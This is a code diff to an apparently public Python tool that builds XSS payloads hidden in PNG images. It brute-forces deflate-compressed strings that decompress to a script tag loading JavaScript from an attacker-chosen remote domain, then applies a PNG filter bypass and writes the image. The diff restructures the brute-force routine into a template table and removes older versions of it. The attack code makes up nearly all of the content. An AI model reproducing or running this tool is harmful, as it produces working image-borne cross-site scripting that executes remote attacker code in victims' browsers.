@@ -2,6 +2,62 @@ from math import floor
 from PIL import Image
 import zlib, binascii
 
+templateTable = {"BZ":["f399281922111510691928276e6e%s1e581b1f576e69b16375535b6f0e7f",0x111111,0xffffff], #Credit to Adam Logue
+	"PE":["7ff399281922111510691928276e6e%s1e51241f576e69b16375535b6f",0x111111,0xffffff], #Credit to fin1te
+	"CZ":["f399281922111510691928276e6e%s1e681b1f576e69b16375535b6f",0x111111,0xffffff], #Credit to Vavkamil
+	"threeXthree":["f399281922111510691928276e6e%s1e%s576e69b16375535b6f",0x111111,0xffffff],
+	"fourXtwo":["f399281922111510691928276e6e%s1e%s576e69b16375535b6f",0x11111111,0xffffffff]
+	}
+
+def gzdeflateBrute(remoteDomain, prefix, tld):
+	#Payload info
+	targetPayload = "<SCRIPT SRC=//"+remoteDomain+"></SCRIPT>"
+	print "[+]Payload:"
+	print "[-]Target Payload:", targetPayload
+
+	#Determine attack template
+	if len(prefix) > 3:
+		print "Domain > 3 -- Not implemented yet!"
+		return
+	if tld.upper() in templateTable.keys():
+		print "[+] Known tld found, using fast attack!"
+		template = templateTable[tld.upper()][0]
+		start = templateTable[tld.upper()][1]
+		end = templateTable[tld.upper()][2]
+	else:
+		if (len(tld) is 3) and (len(prefix) is 3):
+			template = templateTable["threeXthree"][0]
+			start = templateTable["threeXthree"][1]
+			end = templateTable["threeXthree"][2]
+		print "attack not implemented"
+		return
+	
+	#Get keyspace
+	keyspace = end-start
+	print "[-]Calculated Keyspace: %s" % str(keyspace)
+	raw_input("[*]Press Any Key to Begin Bruteforce")
+
+	#BruteForce	
+	print "[+]Starting Gzdeflate Payload Bruteforce..."
+	i=1
+	while start < end:
+		if i % 500000 == 0:
+			print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
+		brute = hex(start)[2:]
+		if "L" in brute:
+			brute = brute[:-1]
+		guess = template % brute
+		deflate = gzdeflate(hex2bin(guess))
+		if targetPayload.upper() in deflate.upper():
+			print "[!]GZDEFLATE PAYLOAD FOUND!"
+			print "Gzdeflate Payload String: %s" % repr(deflate)
+			print "Gzdeflate Payload: %s" % guess
+			return guess
+		start += 1
+		i+=1
+	return False
+
+
 def gzdeflate(string):
         deflated = zlib.compress(string)[2:-4]
         return deflated
@@ -35,29 +91,6 @@ def remoteDomainParse(remoteDomain):
 	prefix = '.'.join(remoteDomain.split(".")[:-1])
 	tld = ''.join(remoteDomain.split(".")[-1:])
 	return prefix,tld
-
-def calcBruteMethod(remoteDomain, prefix, tld):
-	#Payload
-	targetPayload = "<SCRIPT SRC=//"+remoteDomain+"></SCRIPT>"
-	print "[+]PAYLOAD:"
-	print "[-]Target Payload:", targetPayload
-	
-	if tld == "BZ":
-		print "[+]Known tld detected, trying fast method!"
-		gzdeflatePayload = aLogue(targetPayload, prefix)
-		return gzdeflatePayload
-	elif tld == "PE":
-		print "[+]Known tld detected, trying fast method!"
-		gzdeflatePayload = fin1te(targetPayload, prefix)
-		return gzdeflatePayload
-	elif tld == "CZ":
-		print "[+]Known tld detected, trying fast method!"
-		gzdeflatePayload = vavkamil(targetPayload, prefix)
-		return gzdeflatePayload
-	else:
-		print "[+] Unknown tld, attempting slow method"
-		gzdeflatePayload = vakamilBrute(targetPayload, prefix, tld)
-		return gzdeflatePayload
 
 def filterBypass(gzdeflatePayload):
 	print "[+]Crafting payload to bypass PNG filters..."
@@ -111,68 +144,3 @@ def generateFinalPayload(payload, outputImage):
 	print "[!!] COMPLETE [!!]"
 	print "[!!] PNG Payload Saved as: %s" % outputImage
 
-def fin1te(remoteDomain, prefix, tld):
-	#todo
-	return
-
-def aLogue(targetPayload, prefix):
-	#Calculate keyspace
-	start = 0x111111
-	end = 0xffffff
-	keyspace = end-start
-	print "[-]Calculated Keyspace: %s" % str(keyspace)
-	raw_input("[*]Press Any Key to Begin Bruteforce")
-
-	#BruteForce	
-	print "[+]Starting Gzdeflate Payload Bruteforce..."
-	i=1
-	while start < end:
-		if i % 500000 == 0:
-			print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
-		#brute = hex(start).encode('ascii')[2:]
-		brute = hex(start)[2:]
-		if "L" in brute:
-			brute = brute[:-1]
-		guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
-		##DEBUG
-		##guess = 'f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f'
-		deflate = gzdeflate(hex2bin(guess))
-		if targetPayload.upper() in deflate.upper():
-			print "[!]GZDEFLATE PAYLOAD FOUND!"
-			print "Gzdeflate Payload String: %s" % repr(deflate)
-			print "Gzdeflate Payload: %s" % guess
-			return guess
-		start += 1
-		i+=1
-	return False
-
-def vavkamil(remoteDomain, prefix, tld):
-	#todo
-	return
-'''
-def gzdeflateBrute(start, end, keyspace, targetPayload, prefix, tld):
-	#BruteForce	
-	print "[+]Starting Gzdeflate Payload Bruteforce..."
-	i=1
-	while start < end:
-		if i % 500000 == 0:
-			print "[-]Guess:",str(i)+"/"+str(keyspace), "--", "Left:",str(keyspace-i)
-		brute = hex(start).encode('ascii')[2:]
-		if "L" in brute:
-			brute = brute[:-1]
-		guess = '7ff399281922111510691928276e6e'+brute+'576e69b16375535b6f'
-		deflate = gzdeflate(hex2bin(guess))
-		
-		#DEBUG
-		##guess = 'f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f'
-		##print targetPayload.upper()
-		##print deflate.upper()
-		if targetPayload.upper() in deflate.upper():
-			print "[!]GZDEFLATE PAYLOAD FOUND!"
-			print "Gzdeflate Payload String: %s" % repr(deflate)
-			print "Gzdeflate Payload: %s" % guess
-			break
-		else:
-			start += 1
-			i += 1
-'''
